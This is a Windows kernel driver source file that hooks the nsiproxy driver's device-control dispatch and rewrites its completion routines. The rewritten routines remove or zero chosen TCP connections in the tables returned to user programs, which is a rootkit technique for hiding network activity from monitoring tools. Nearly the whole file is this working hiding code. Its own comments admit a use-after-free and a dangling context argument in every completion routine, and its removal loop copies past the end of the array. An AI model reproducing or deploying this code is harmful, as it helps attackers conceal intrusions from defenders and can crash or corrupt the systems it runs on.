#include <ntifs.h>
#include "NetworkHook.h"

PDRIVER_OBJECT NsiHook::g_NetNSIProxyDriverObject = nullptr;
PDRIVER_DISPATCH NsiHook::g_NetOldNSIProxyDeviceControl = nullptr;

NTSTATUS NsiHook::NetHookNSIProxy()
{
	UNICODE_STRING NsiDriverName = RTL_CONSTANT_STRING(L"\\Driver\\nsiproxy");

	KdPrint(("Hooking NsiProxy..\n"));

	NTSTATUS status = ObReferenceObjectByName(
		&NsiDriverName,
		OBJ_CASE_INSENSITIVE,
		nullptr,
		0,
		*IoDriverObjectType,
		KernelMode,
		nullptr,
		(PVOID*)(&g_NetNSIProxyDriverObject));
	if (!NT_SUCCESS(status))
	{
		KdPrint(("ObReferenceObjectByName Faileed. Failed to find nsiproxy! (0x%08X)\n", status));
		return status;
	}

	if (g_NetOldNSIProxyDeviceControl == nullptr)
	{
		g_NetOldNSIProxyDeviceControl = g_NetNSIProxyDriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL];

		if (g_NetOldNSIProxyDeviceControl == nullptr)
		{
			KdPrint(("Missing NSIProxy Handler\n"));
			return STATUS_SUCCESS;
		}
	}

	//perform IRP hook
// #pragma warning(suppress : 4311)
// #pragma warning(suppress : 4302)
	InterlockedExchange64(
		(LONG64*)&g_NetNSIProxyDriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL],
		(LONG64)NetNSIProxyDeviceControlHook
	);

	return STATUS_SUCCESS;
}

BOOLEAN NsiHook::NetNSIFreeHook()
{
	if (g_NetOldNSIProxyDeviceControl)
	{
		InterlockedExchange64(
			(LONG64*)&g_NetNSIProxyDriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL],
			(LONG64)g_NetOldNSIProxyDeviceControl
		);

		//decrease reference count of hooked driver
		ObDereferenceObject(g_NetNSIProxyDriverObject);

		return TRUE;
	}

	return FALSE;
}

#if DBG
// Declaration
typedef PCHAR(*GET_PROCESS_IMAGE_NAME) (PEPROCESS Process);
GET_PROCESS_IMAGE_NAME gGetProcessImageFileName;

char* GetProcessNameFromPid(HANDLE pid)
{
	PEPROCESS Process;
	if (PsLookupProcessByProcessId(pid, &Process) == STATUS_INVALID_PARAMETER)
	{
		return "pid???";
	}
	UNICODE_STRING sPsGetProcessImageFileName = RTL_CONSTANT_STRING(L"PsGetProcessImageFileName");
	gGetProcessImageFileName = (GET_PROCESS_IMAGE_NAME)MmGetSystemRoutineAddress(&sPsGetProcessImageFileName);
	// To use it
	if (NULL != gGetProcessImageFileName)
	{
		PCHAR pImageName = gGetProcessImageFileName(Process);
		return pImageName;
	}
	return "";
}


static VOID PrintSocketAddr(ULONG localIP, USHORT localPort, ULONG foreignIP)
{
	union
	{
		USHORT port;
		UCHAR portbytes[2];
	}port;

	ULONG localbytes[4]{};
	localbytes[0] = localIP & 0xFF;
	localbytes[1] = (localIP >> 8) & 0xFF;
	localbytes[2] = (localIP >> 16) & 0xFF;
	localbytes[3] = (localIP >> 24) & 0xFF;
	port.port = 0;
	port.portbytes[0] = (localPort >> 8) & 0xFF;
	port.portbytes[1] = localPort & 0xFF;
	DbgPrint("%d.%d.%d.%d:%d\t", localbytes[0], localbytes[1], localbytes[2], localbytes[3], port.port);


	ULONG foreignbytes[4]{};
	foreignbytes[0] = foreignIP & 0xFF;
	foreignbytes[1] = (foreignIP >> 8) & 0xFF;
	foreignbytes[2] = (foreignIP >> 16) & 0xFF;
	foreignbytes[3] = (foreignIP >> 24) & 0xFF;
	DbgPrint("%d.%d.%d.%d\n", foreignbytes[0], foreignbytes[1], foreignbytes[2], foreignbytes[3]);
}

static VOID PrintTCPInformation(ULONG ProcessId, ULONG localIP, USHORT localPort, ULONG foreignIP, ULONG ConnectionState)
{
	ASSERT(ProcessId);
	DbgPrint("%ld:[%s]\t", ProcessId, GetProcessNameFromPid((HANDLE)ProcessId));

	union
	{
		USHORT port;
		UCHAR portbytes[2];
	}port;

	ULONG localbytes[4]{};
	localbytes[0] = localIP & 0xFF;
	localbytes[1] = (localIP >> 8) & 0xFF;
	localbytes[2] = (localIP >> 16) & 0xFF;
	localbytes[3] = (localIP >> 24) & 0xFF;
	port.port = 0;
	port.portbytes[0] = (localPort >> 8) & 0xFF;
	port.portbytes[1] = localPort & 0xFF;
	DbgPrint("%d.%d.%d.%d:%d\t", localbytes[0], localbytes[1], localbytes[2], localbytes[3], port.port);


	ULONG foreignbytes[4]{};
	foreignbytes[0] = foreignIP & 0xFF;
	foreignbytes[1] = (foreignIP >> 8) & 0xFF;
	foreignbytes[2] = (foreignIP >> 16) & 0xFF;
	foreignbytes[3] = (foreignIP >> 24) & 0xFF;
	DbgPrint("%d.%d.%d.%d\t", foreignbytes[0], foreignbytes[1], foreignbytes[2], foreignbytes[3]);

	DbgPrint("State:[%ld]-", ConnectionState);

	switch (ConnectionState)
	{
	case 1:		// The TCP connection is in the CLOSED state that represents no connection state at all.
		DbgPrint("MIB_TCP_STATE_CLOSED\n");
		break;
	case 2:		// The TCP connection is in the LISTEN state waiting for a connection request from any remote TCP and port.
		DbgPrint("MIB_TCP_STATE_LISTEN\n");
		break;
	case 3:	// The TCP connection is in the SYN-SENT state waiting for a matching connection request after having sent a connection request (SYN packet).
		DbgPrint("MIB_TCP_STATE_SYN_SENT\n");
		break;
	case 4:	// The TCP connection is in the SYN-RECEIVED state waiting for a confirming connection request acknowledgment after having both received and sent a connection request (SYN packet).
		DbgPrint("MIB_TCP_STATE_SYN_RCVD\n");
		break;
	case 5:		// The TCP connection is in the ESTABLISHED state that represents an open connection, data received can be delivered to the user. This is the normal state for the data transfer phase of the TCP connection.
		DbgPrint("MIB_TCP_STATE_ESTAB\n");
		break;
	case 6:	// The TCP connection is FIN-WAIT-1 state waiting for a connection termination request from the remote TCP, or an acknowledgment of the connection termination request previously sent.
		DbgPrint("MIB_TCP_STATE_FIN_WAIT1\n");
		break;
	case 7:	// The TCP connection is FIN-WAIT-1 state waiting for a connection termination request from the remote TCP.
		DbgPrint("MIB_TCP_STATE_FIN_WAIT2\n");
		break;
	case 8:	// The TCP connection is in the CLOSE-WAIT state waiting for a connection termination request from the local user.
		DbgPrint("MIB_TCP_STATE_CLOSE_WAIT\n");
		break;
	case 9:		// The TCP connection is in the CLOSING state waiting for a connection termination request acknowledgment from the remote TCP.
		DbgPrint("MIB_TCP_STATE_CLOSING\n");
		break;
	case 10:	// The TCP connection is in the LAST-ACK state waiting for an acknowledgment of the connection termination request previously sent to the remote TCP (which includes an acknowledgment of its connection termination request).
		DbgPrint("MIB_TCP_STATE_LAST_ACK\n");
		break;
	case 11:	// The TCP connection is in the TIME-WAIT state waiting for enough time to pass to be sure the remote TCP received the acknowledgment of its connection termination request.
		DbgPrint("MIB_TCP_STATE_TIME_WAIT\n");
		break;
	case 12:	// The TCP connection is in the delete TCB state that represents the deletion of the Transmission Control Block (TCB), a data structure used to maintain information on each TCP entry.
		DbgPrint("MIB_TCP_STATE_DELETE_TCB\n");
		break;
	default:
		DbgPrint("Unknown Connection State\n");
		break;
	}
}
#endif

NTSTATUS NsiHook::NetNSIProxyCompletionRoutineX86(
	IN PDEVICE_OBJECT DeviceObject,
	IN PIRP Irp,
	IN PVOID Context)
{
	KAPC_STATE ApcState{};
	PHOOKED_IO_COMPLETION HookedContext = (PHOOKED_IO_COMPLETION)Context;
	if (!NT_SUCCESS(Irp->IoStatus.Status))
	{
		goto free_exit;
	}

	NSI_PARAM* NsiParam = (NSI_PARAM*)(Irp->UserBuffer);
	if (!MmIsAddressValid(NsiParam->lpMem))
	{
		goto free_exit;
	}

	if ((NsiParam->UnknownParam8 != 0x38))
	{
		KdPrint(("NetNSIProxyCompletionRoutine: NsiParam->UnknownParam8:[0x%x]\n", NsiParam->UnknownParam8));
		goto free_exit;
	}

	PINTERNAL_TCP_TABLE_ENTRY pTcpEntry = (PINTERNAL_TCP_TABLE_ENTRY)NsiParam->lpMem;
	PNSI_STATUS_ENTRY_2 pStatusEntry = (PNSI_STATUS_ENTRY_2)NsiParam->lpStatus;
	PNSI_PROCESSID_INFO  pNsiProcessIdInfo = (PNSI_PROCESSID_INFO)NsiParam->UnknownParam13;
	DWORD numOfEntries = NsiParam->TcpConnCount;

	KeStackAttachProcess(HookedContext->RequestingProcess, &ApcState);
	for (DWORD i = 0; i < numOfEntries; i++)
	{
#if DBG
		/* PrintSocketAddr(pTcpEntry[i].localEntry.dwIP, pTcpEntry[i].localEntry.Port,
			pTcpEntry[i].remoteEntry.dwIP);	*/
		PrintTCPInformation(pNsiProcessIdInfo->dwProcessId, pTcpEntry[i].localEntry.dwIP, pTcpEntry[i].localEntry.Port,
			pTcpEntry[i].remoteEntry.dwIP, pStatusEntry->dwState);
#endif

		if (NetHook::NetIsHiddenIpAddress(pTcpEntry[i].localEntry.dwIP,
			pTcpEntry[i].localEntry.Port,
			pTcpEntry[i].remoteEntry.dwIP))
		{
			// RtlZeroMemory(&pTcpEntry[i], sizeof(INTERNAL_TCP_TABLE_ENTRY));

			// NSI will map status array entry to tcp table array entry
			// we must modify both synchronously
			RtlCopyMemory(&pTcpEntry[i], &pTcpEntry[i + 1], sizeof(INTERNAL_TCP_TABLE_ENTRY) * (numOfEntries - i));
			RtlCopyMemory(&pStatusEntry[i], &pStatusEntry[i + 1], sizeof(NSI_STATUS_ENTRY) * (numOfEntries - i));
			numOfEntries--;
			NsiParam->TcpConnCount--;
			i--;
		}
	}
	KeUnstackDetachProcess(&ApcState);

free_exit:

	IoGetNextIrpStackLocation(Irp)->Context = HookedContext->OriginalContext;
	IoGetNextIrpStackLocation(Irp)->CompletionRoutine = HookedContext->OriginalCompletionRoutine;

	ExFreePoolWithTag(HookedContext, TAG_NET);

	//
	// ERR: There's a use after free here.
	//
	if ((HookedContext != nullptr) && (HookedContext->InvokeOnSuccess) && IoGetNextIrpStackLocation(Irp)->CompletionRoutine)
	{
		//
		// ERR: Pass a Dangling Context Argument
		//
		return IoGetNextIrpStackLocation(Irp)->CompletionRoutine(DeviceObject, Irp, Context);
	}
	else
	{
		if (Irp->PendingReturned)
		{
			IoMarkIrpPending(Irp);
		}
	}

	return STATUS_SUCCESS;
}

NTSTATUS NsiHook::NetNSIProxyCompletionRoutineExperiment(
	IN PDEVICE_OBJECT DeviceObject,
	IN PIRP Irp,
	IN PVOID Context)
{	
	KAPC_STATE ApcState{};
	PHOOKED_IO_COMPLETION HookedContext = (PHOOKED_IO_COMPLETION)Context;
	if (!NT_SUCCESS(Irp->IoStatus.Status))
	{
		goto free_exit;
	}

	PNSI_PARAM_2 NsiParam = (PNSI_PARAM_2)Irp->UserBuffer;
	if (!MmIsAddressValid(NsiParam->UnknownParam7))
	{
		goto free_exit;
	}

	if (NsiParam->UnknownParam8 != 0x38)
	{
		goto free_exit;
	}

	PINTERNAL_TCP_TABLE_ENTRY pTcpEntry = (PINTERNAL_TCP_TABLE_ENTRY)NsiParam->UnknownParam7;
	PNSI_STATUS_ENTRY_2 pNsiStatusEntry = (PNSI_STATUS_ENTRY_2)NsiParam->UnknownParam11;
	PNSI_PROCESSID_INFO  pNsiProcessIdInfo = (PNSI_PROCESSID_INFO)NsiParam->UnknownParam13;
	SIZE_T numOfEntries = NsiParam->ConnCount;

	KeStackAttachProcess(HookedContext->RequestingProcess, &ApcState);

	for (SIZE_T i = 0; i < numOfEntries; i++)
	{
#if DBG
		// ASSERT(NsiBufferEntries[i].IpAddress == pTcpEntry[i].remoteEntry.dwIP);
		PrintTCPInformation(pNsiProcessIdInfo->dwProcessId, pTcpEntry[i].localEntry.dwIP, pTcpEntry[i].localEntry.Port,
			pTcpEntry[i].remoteEntry.dwIP, pNsiStatusEntry->dwState);
#endif

		if (NetHook::NetIsHiddenIpAddress(pTcpEntry[i].localEntry.dwIP,
			pTcpEntry[i].localEntry.Port,
			pTcpEntry[i].remoteEntry.dwIP))
		{
			RtlZeroMemory(&pTcpEntry[i], sizeof(INTERNAL_TCP_TABLE_ENTRY));
		}
	}

	KeUnstackDetachProcess(&ApcState);

free_exit:

	IoGetNextIrpStackLocation(Irp)->Context = HookedContext->OriginalContext;
	IoGetNextIrpStackLocation(Irp)->CompletionRoutine = HookedContext->OriginalCompletionRoutine;

	ExFreePoolWithTag(HookedContext, TAG_NET);

	//
	// ERR: There's a use after free here.
	//
	if ((HookedContext != nullptr) && (HookedContext->InvokeOnSuccess) && IoGetNextIrpStackLocation(Irp)->CompletionRoutine)
	{
		//
		// ERR: Pass a Dangling Context Argument
		//
		return IoGetNextIrpStackLocation(Irp)->CompletionRoutine(DeviceObject, Irp, Context);
	}
	else
	{
		if (Irp->PendingReturned)
		{
			IoMarkIrpPending(Irp);
		}
	}

	return STATUS_SUCCESS;
}

NTSTATUS NsiHook::NetNSIProxyCompletionRoutine(
	IN PDEVICE_OBJECT DeviceObject,
	IN PIRP Irp,
	IN PVOID Context)
{
	KAPC_STATE ApcState{};
	PHOOKED_IO_COMPLETION HookedContext = (PHOOKED_IO_COMPLETION)Context;
	if (!NT_SUCCESS(Irp->IoStatus.Status))
	{
		goto free_exit;
	}

	PNSI_STRUCTURE_1 NsiParam = (PNSI_STRUCTURE_1)Irp->UserBuffer;
	if (!MmIsAddressValid(NsiParam->Entries))
	{
		goto free_exit;
	}

	if (NsiParam->EntrySize != sizeof(NSI_STRUCTURE_ENTRY))
	{
		goto free_exit;
	}

	KeStackAttachProcess(HookedContext->RequestingProcess, &ApcState);
	PINTERNAL_TCP_TABLE_ENTRY pTcpEntry = (PINTERNAL_TCP_TABLE_ENTRY)NsiParam->Entries;

#if DBG
	PNSI_STRUCTURE_ENTRY NsiBufferEntries = &(NsiParam->Entries->EntriesStart[0]);
#endif 

	SIZE_T numOfEntries = NsiParam->NumberOfEntries;	
	for (SIZE_T i = 0; i < numOfEntries; i++)
	{
#if DBG
		ASSERT(NsiBufferEntries[i].IpAddress == pTcpEntry[i].remoteEntry.dwIP);
		PrintSocketAddr(pTcpEntry[i].localEntry.dwIP, pTcpEntry[i].localEntry.Port,
			pTcpEntry[i].remoteEntry.dwIP);
#endif

		if (NetHook::NetIsHiddenIpAddress(pTcpEntry[i].localEntry.dwIP,
			pTcpEntry[i].localEntry.Port,
			pTcpEntry[i].remoteEntry.dwIP))
		{
			RtlZeroMemory(&pTcpEntry[i], sizeof(INTERNAL_TCP_TABLE_ENTRY));
		}
	}

	KeUnstackDetachProcess(&ApcState);

free_exit:

	IoGetNextIrpStackLocation(Irp)->Context = HookedContext->OriginalContext;
	IoGetNextIrpStackLocation(Irp)->CompletionRoutine = HookedContext->OriginalCompletionRoutine;

	ExFreePoolWithTag(HookedContext, TAG_NET);

	//
	// ERR: There's a use after free here.
	//
	if ((HookedContext != nullptr) && (HookedContext->InvokeOnSuccess) && IoGetNextIrpStackLocation(Irp)->CompletionRoutine)
	{
		//
		// ERR: Pass a Dangling Context Argument
		//
		return IoGetNextIrpStackLocation(Irp)->CompletionRoutine(DeviceObject, Irp, Context);
	}
	else
	{
		if (Irp->PendingReturned)
		{
			IoMarkIrpPending(Irp);
		}
	}

	return STATUS_SUCCESS;
}

NTSTATUS NsiHook::NetNSIProxyDeviceControlHook(
	IN PDEVICE_OBJECT DeviceObject,
	IN PIRP Irp)
{
	PIO_STACK_LOCATION IrpStack{ IoGetCurrentIrpStackLocation(Irp) };
	ULONG io_control_code{ IrpStack->Parameters.DeviceIoControl.IoControlCode };

	if (IOCTL_NSI_GETALLPARAM == io_control_code)
	{
		//if call is relevent hook the CompletionRoutine
		PHOOKED_IO_COMPLETION hook = (PHOOKED_IO_COMPLETION)ExAllocatePool2(POOL_FLAG_NON_PAGED, sizeof(HOOKED_IO_COMPLETION), TAG_NET);
		if (hook == nullptr)
		{
			//call the original DeviceIoControl func
			return g_NetOldNSIProxyDeviceControl(DeviceObject, Irp);
		}

		hook->OriginalCompletionRoutine = IrpStack->CompletionRoutine;
		hook->OriginalContext = IrpStack->Context;

		IrpStack->Context = hook;		

		if (IrpStack->Parameters.DeviceIoControl.InputBufferLength == sizeof(_NSI_STRUCTURE_1))
		{
			KdPrint(("InputBufferLength:[%lu] sizeof(NSI_STRUCTURE):[%zu] sizeof(NSI_PARAM_2):[%zu]\n",
				IrpStack->Parameters.DeviceIoControl.InputBufferLength, sizeof(_NSI_STRUCTURE_1), sizeof(NSI_PARAM_2)));
			IrpStack->CompletionRoutine = NetNSIProxyCompletionRoutineExperiment;
		}
		else if (IrpStack->Parameters.DeviceIoControl.InputBufferLength == sizeof(NSI_PARAM))
		{
			KdPrint(("InputBufferLength:[%lu] sizeof(NSI_PARAM):[%zu] sizeof(NSI_PARAM_2):[%zu]\n",
				IrpStack->Parameters.DeviceIoControl.InputBufferLength, sizeof(NSI_PARAM), sizeof(NSI_PARAM_2)));
			IrpStack->CompletionRoutine = NetNSIProxyCompletionRoutineX86;
		}
		else
		{
			KdPrint(("InputBufferLength:%lu. Calling Original IO Function.\n",
				IrpStack->Parameters.DeviceIoControl.InputBufferLength));

			//call the original DeviceIoControl func
			ExFreePoolWithTag(hook, TAG_NET);
			return g_NetOldNSIProxyDeviceControl(DeviceObject, Irp);
		}	
		
		hook->RequestingProcess = PsGetCurrentProcess();
		hook->InvokeOnSuccess = (IrpStack->Control & SL_INVOKE_ON_SUCCESS) ? TRUE : FALSE;

		IrpStack->Control |= SL_INVOKE_ON_SUCCESS;
	}

	//call the original DeviceIoControl func
	return g_NetOldNSIProxyDeviceControl(DeviceObject, Irp);
}